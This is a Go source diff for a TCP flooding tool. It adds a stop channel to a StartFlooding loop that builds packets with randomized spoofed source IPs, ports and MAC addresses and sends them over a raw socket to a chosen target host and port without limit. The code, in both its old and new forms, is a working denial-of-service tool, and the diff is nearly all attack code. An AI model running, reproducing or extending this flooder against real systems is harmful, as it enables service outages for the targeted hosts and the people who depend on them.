@@ -17,7 +17,7 @@ func init() {
 }
 
 // StartFlooding does the heavy lifting, starts the flood
-func StartFlooding(destinationHost string, destinationPort, payloadLength int, floodType string) error {
+func StartFlooding(shouldStop chan bool, destinationHost string, destinationPort, payloadLength int, floodType string) error {
 	var (
 		ipHeader   *ipv4.Header
 		packetConn net.PacketConn
@@ -30,7 +30,7 @@ func StartFlooding(destinationHost string, destinationPort, payloadLength int, f
 		return err
 	}
 
-	description := fmt.Sprintf("Flood is in progress, target=%s:%d, floodType=%s, payloadLength=%d\n",
+	description := fmt.Sprintf("Flood is in progress, target=%s:%d, floodType=%s, payloadLength=%d",
 		destinationHost, destinationPort, floodType, payloadLength)
 	bar := progressbar.DefaultBytes(-1, description)
 
@@ -40,53 +40,58 @@ func StartFlooding(destinationHost string, destinationPort, payloadLength int, f
 	macAddrs := getMacAddrs()
 
 	for {
-		tcpPacket := buildTcpPacket(srcPorts[rand.Intn(len(srcPorts))], destinationPort, floodType)
-		ipPacket := buildIpPacket(srcIps[rand.Intn(len(srcIps))], destinationHost)
-		if err = tcpPacket.SetNetworkLayerForChecksum(ipPacket); err != nil {
-			return err
-		}
+		select {
+		case <-shouldStop:
+			return nil
+		default:
+			tcpPacket := buildTcpPacket(srcPorts[rand.Intn(len(srcPorts))], destinationPort, floodType)
+			ipPacket := buildIpPacket(srcIps[rand.Intn(len(srcIps))], destinationHost)
+			if err = tcpPacket.SetNetworkLayerForChecksum(ipPacket); err != nil {
+				return err
+			}
 
-		// Serialize.  Note:  we only serialize the TCP layer, because the
-		// socket we get with net.ListenPacket wraps our data in IPv4 packets
-		// already.  We do still need the IP layer to compute checksums
-		// correctly, though.
-		ipHeaderBuf := gopacket.NewSerializeBuffer()
-		opts := gopacket.SerializeOptions{
-			FixLengths:       true,
-			ComputeChecksums: true,
-		}
+			// Serialize.  Note:  we only serialize the TCP layer, because the
+			// socket we get with net.ListenPacket wraps our data in IPv4 packets
+			// already.  We do still need the IP layer to compute checksums
+			// correctly, though.
+			ipHeaderBuf := gopacket.NewSerializeBuffer()
+			opts := gopacket.SerializeOptions{
+				FixLengths:       true,
+				ComputeChecksums: true,
+			}
 
-		if err = ipPacket.SerializeTo(ipHeaderBuf, opts); err != nil {
-			return err
-		}
+			if err = ipPacket.SerializeTo(ipHeaderBuf, opts); err != nil {
+				return err
+			}
 
-		if ipHeader, err = ipv4.ParseHeader(ipHeaderBuf.Bytes()); err != nil {
-			return err
-		}
+			if ipHeader, err = ipv4.ParseHeader(ipHeaderBuf.Bytes()); err != nil {
+				return err
+			}
 
-		ethernetLayer := buildEthernetPacket(macAddrs[rand.Intn(len(macAddrs))], macAddrs[rand.Intn(len(macAddrs))])
-		tcpPayloadBuf := gopacket.NewSerializeBuffer()
-		pyl := gopacket.Payload(payload)
+			ethernetLayer := buildEthernetPacket(macAddrs[rand.Intn(len(macAddrs))], macAddrs[rand.Intn(len(macAddrs))])
+			tcpPayloadBuf := gopacket.NewSerializeBuffer()
+			pyl := gopacket.Payload(payload)
 
-		if err = gopacket.SerializeLayers(tcpPayloadBuf, opts, ethernetLayer, tcpPacket, pyl); err != nil {
-			return err
-		}
+			if err = gopacket.SerializeLayers(tcpPayloadBuf, opts, ethernetLayer, tcpPacket, pyl); err != nil {
+				return err
+			}
 
-		// XXX send packet
-		if packetConn, err = net.ListenPacket("ip4:tcp", "0.0.0.0"); err != nil {
-			return err
-		}
+			// XXX send packet
+			if packetConn, err = net.ListenPacket("ip4:tcp", "0.0.0.0"); err != nil {
+				return err
+			}
 
-		if rawConn, err = ipv4.NewRawConn(packetConn); err != nil {
-			return err
-		}
+			if rawConn, err = ipv4.NewRawConn(packetConn); err != nil {
+				return err
+			}
 
-		if err = rawConn.WriteTo(ipHeader, tcpPayloadBuf.Bytes(), nil); err != nil {
-			return err
-		}
+			if err = rawConn.WriteTo(ipHeader, tcpPayloadBuf.Bytes(), nil); err != nil {
+				return err
+			}
 
-		if err = bar.Add(payloadLength); err != nil {
-			return err
+			if err = bar.Add(payloadLength); err != nil {
+				return err
+			}
 		}
 	}
 }
